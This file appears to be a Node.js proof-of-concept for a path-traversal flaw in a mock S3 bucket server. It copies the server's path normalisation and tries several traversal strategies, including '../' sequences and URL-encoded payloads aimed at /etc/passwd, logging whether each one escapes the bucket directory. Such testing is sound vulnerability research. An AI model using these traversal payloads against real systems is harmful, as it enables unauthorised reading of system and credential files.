const path = require("path");
const localDir = "/home/user/poc/vuln-002-real/mock-data/S3/vuln002-testbucket-dev";
const route = "/vuln002-testbucket-dev";

function sim(prefix) {
  const rawUrl = route + "/?prefix=" + prefix;

  let reqUrl = path.normalize(decodeURIComponent(rawUrl));

  const temp = reqUrl.split(route);
  let paramsPath = prefix + "/";

  if (temp[1] !== undefined) {
    paramsPath = path.normalize(path.join(paramsPath, temp[1].split("?")[0]));
  } else {
    paramsPath = path.normalize(path.join(paramsPath, temp[0].split("?")[0]));
  }

  if (paramsPath[0] === "/" || paramsPath[0] === ".") {
    paramsPath = paramsPath.substring(1);
  }

  const finalPath = path.normalize(path.join(localDir, paramsPath));

  console.log("prefix:", JSON.stringify(prefix));
  console.log("  normalizedUrl:", reqUrl);
  console.log("  temp[1]:", temp[1] !== undefined ? JSON.stringify(temp[1]) : "undefined");
  console.log("  paramsPath:", JSON.stringify(paramsPath));
  console.log("  finalPath:", finalPath);
  console.log("  escaped:", !finalPath.startsWith(path.resolve(localDir)));
  console.log("");
}

// Strategy 1: Small prefix (route survives)
sim("../..");
sim("../../..");

// Strategy 2: Pure ../ targeting root (route destroyed)
sim("../../../../../../../../");
sim("../../../../../../../..");

// Strategy 3: With target (route destroyed)
sim("../../../../../../../../etc");
sim("../../../../../../../../../../etc");

// Strategy 4: No prefix, URL path traversal
function simGet(urlPath) {
  let reqUrl = path.normalize(decodeURIComponent(urlPath));
  const temp = reqUrl.split(route);
  let paramsPath = "";

  if (temp[1] !== undefined) {
    paramsPath = path.normalize(path.join(paramsPath, temp[1].split("?")[0]));
  } else {
    paramsPath = path.normalize(path.join(paramsPath, temp[0].split("?")[0]));
  }

  if (paramsPath[0] === "/" || paramsPath[0] === ".") {
    paramsPath = paramsPath.substring(1);
  }

  const finalPath = path.normalize(path.join(localDir, paramsPath));

  console.log("url:", JSON.stringify(urlPath));
  console.log("  normalizedUrl:", reqUrl);
  console.log("  temp[1]:", temp[1] !== undefined ? JSON.stringify(temp[1]) : "undefined");
  console.log("  paramsPath:", JSON.stringify(paramsPath));
  console.log("  finalPath:", finalPath);
  console.log("  escaped:", !finalPath.startsWith(path.resolve(localDir)));
  console.log("");
}

console.log("=== URL PATH TRAVERSAL (no prefix) ===");
simGet("/vuln002-testbucket-dev/../../../../../../etc/passwd");
simGet("/vuln002-testbucket-dev/..%2F..%2F..%2Fetc%2Fpasswd");
